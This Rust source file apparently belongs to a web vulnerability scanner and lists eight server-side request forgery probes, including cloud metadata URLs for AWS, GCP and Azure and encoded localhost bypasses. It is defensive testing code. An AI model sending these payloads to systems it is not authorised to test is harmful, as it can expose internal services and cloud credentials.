use crate::domain::active_vuln::{ExpectedIndicator, PayloadDefinition};
use crate::domain::entities::SeverityLevel;

pub fn get_payloads() -> Vec<PayloadDefinition> {
    vec![
        PayloadDefinition {
            id: "ssrf_01".into(),
            payload: "http://127.0.0.1".into(),
            description: "Localhost SSRF probe".into(),
            expected_indicator: ExpectedIndicator::ResponseDiff {
                baseline_hash: String::new(),
                indicator: "internal_page".into(),
            },
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "ssrf_02".into(),
            payload: "http://169.254.169.254/latest/meta-data/".into(),
            description: "AWS metadata endpoint".into(),
            expected_indicator: ExpectedIndicator::ReflectedContent("ami-id".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "ssrf_03".into(),
            payload: "http://metadata.google.internal/computeMetadata/v1/".into(),
            description: "GCP metadata endpoint".into(),
            expected_indicator: ExpectedIndicator::ReflectedContent("instance".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "ssrf_04".into(),
            payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01".into(),
            description: "Azure IMDS metadata endpoint".into(),
            expected_indicator: ExpectedIndicator::ReflectedContent("compute".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "ssrf_05".into(),
            payload: "http://0.0.0.0".into(),
            description: "Zero-address SSRF bypass".into(),
            expected_indicator: ExpectedIndicator::StatusCode(200),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "ssrf_06".into(),
            payload: "http://[::1]".into(),
            description: "IPv6 localhost SSRF".into(),
            expected_indicator: ExpectedIndicator::StatusCode(200),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "ssrf_07".into(),
            payload: "http://0x7f000001".into(),
            description: "Hex-encoded localhost bypass".into(),
            expected_indicator: ExpectedIndicator::StatusCode(200),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "ssrf_08".into(),
            payload: "http://2130706433".into(),
            description: "Decimal IP localhost bypass".into(),
            expected_indicator: ExpectedIndicator::StatusCode(200),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
    ]
}
